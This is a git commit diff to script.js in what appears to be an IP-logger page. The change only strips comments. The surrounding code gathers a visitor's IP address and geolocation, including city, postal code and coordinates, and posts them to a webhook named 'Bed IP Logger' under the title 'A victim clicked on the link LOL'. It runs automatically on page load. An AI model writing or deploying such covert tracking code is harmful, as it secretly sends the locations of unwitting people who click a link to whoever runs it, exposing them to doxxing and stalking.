01d978518d0f1e1b74551bb6cd1d94e41e01a6e9
a8q5 <gloomyontop1@gmail.com>
2025-10-12 15:31:25 -0500

    Update script.js

--- script.js
+++ script.js
@@ -13,14 +13,14 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "Bed IP Logger", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            username: "Bed IP Logger",
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                             content: `guhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh`,
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link LOL',
                                     description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
-                                    color: 0x800080 // optionally changeable
+                                    color: 0x800080
                                 }
                             ]
                         })
@@ -40,5 +40,6 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
 
